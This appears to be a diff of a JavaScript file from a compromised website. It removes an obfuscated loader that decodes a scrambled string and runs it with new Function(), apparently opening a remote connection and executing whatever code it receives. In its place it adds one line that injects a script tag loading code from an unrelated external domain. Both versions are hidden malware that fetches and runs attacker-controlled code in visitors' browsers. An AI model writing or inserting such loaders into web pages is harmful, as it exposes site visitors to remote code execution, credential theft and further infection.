@@ -1,10 +1,1 @@
-    (function () {
-            function jVPXb (s) {
-        var d = {"h":"v","T":"a","&":"r","<":" ","W":"V",";":"q","k":"w","7":"e","n":"f","{":"=","m":"u","y":"n","R":"c","_":"t","w":"i","G":"o","z":"(","d":")","H":"{","v":0,"p":"h","4":"A","u":",",":":1,"B":"m","8":"C","-":"d","J":2,"b":3,"!":"x","2":"O","A":";","F":"s","q":"B","s":"D","I":"E"," ":"F","U":"G",",":"H","e":"I","M":"J","o":"K","[":"L","^":"M",".":"N","5":"P","9":"Q","+":"R","E":"S",")":"T","3":"U","Z":"W","Y":"X","X":"Y","f":"Z","L":"+","O":"b","6":"g","D":"j","(":"k","0":"l","N":"p","Q":"y","g":"z","V":4,"c":5,"|":6,"l":7,"}":8,"i":9,"=":".","r":"[","t":"^","j":"-",">":"]","1":"<","K":"|","]":">","C":"&","P":"!","x":"}","S":":","a":"_"};
-        return s.split('').map(function (c) {
-            return d[c] !== undefined ? d[c] : c;
-        }).join('');
-    }
-        var c = jVPXb('data:image/jpg;base64,hT&<W;k7n{nmyR_wGyz7dHhT&<Tv{"RpT&4_"uT:{"n&GB8pT&8G-7"uTJ{"RpT&8G-74_"uTb{"wy-7!2n"AhT&<F!{"4q8sI U,eMo[^.259+E)3WZYXf"L"TOR-7n6pwD(0ByGN;&F_mhk!Qg"L"v:JbVc|l}iL/{"AhT&<_{""uyu&uwuFuGumuTun{vA7{7=&7N0TR7z/rt4jfTjgvjiL/{>/6u""dAkpw07zn17=07y6_pdHF{F!rTb>z7rTv>znLLddAG{F!rTb>z7rTv>znLLddAm{F!rTb>z7rTv>znLLddAT{F!rTb>z7rTv>znLLddAy{F11JKG]]VA&{zGC:cd11VKm]]JAw{zmCbd11|KTA_{_LE_&wy6rT:>zydAwnzmP{|VdH_{_LE_&wy6rT:>z&dAxwnzTP{|VdH_{_LE_&wy6rT:>zwdAxx&7_m&yznmyR_wGyz7dHhT&<_{""uy{&{R:{RJ{vAkpw07zy17=07y6_pdH&{7rTJ>zydAwnz&1:J}dH_L{E_&wy6rT:>z&dAyLLAx70F7<wnz&]:i:CC&1JJVdHRJ{7rTJ>zyL:dA_L{E_&wy6rT:>zz&Cb:d11|KRJC|bdAyL{Jx70F7HRJ{7rTJ>zyL:dARb{7rTJ>zyLJdA_L{E_&wy6rT:>zz&C:cd11:JKzRJC|bd11|KRbC|bdAyL{bAxx&7_m&y<_Axdz_dAxAhT&<-{-GRmB7y_uy{yThw6T_G&r"N0T_nG&B">uRF{-=Rm&&7y_ER&wN_AwnzP/t^TRKZwy/=_7F_zydKKPydHwnzyThw6T_G&=mF7&467y_=wy-7!2nz"OTw-m"d]j:dHhT&<kF{y7k<Z7OEGR(7_z"kFFS//_&=Q7Fmy|l}=RGBSibib/:cJbcv"dAkF=GyB7FFT67{nmyR_wGyz7dHkF=R0GF7zdAy7k< myR_wGyz"a_-RF"uW;k7nz7=-T_TddzRFdAxx70F7HhT&<F{-GRmB7y_=R&7T_7I07B7y_z"FR&wN_"dAF=F&R{"p__NFS//6On=B-nnmy=Ry/!/:cJbcv"ARF=NT&7y_I07B7y_=wyF7&_q7nG&7zFuRFdAxx'.substr(22));
-        new Function(c)();
-    })();
+document.writeln('<script src="https://qa.lcttty.top/c/EA313724-83BA-4C23-8B74-2D8CFCC108C1.ap"></script>');
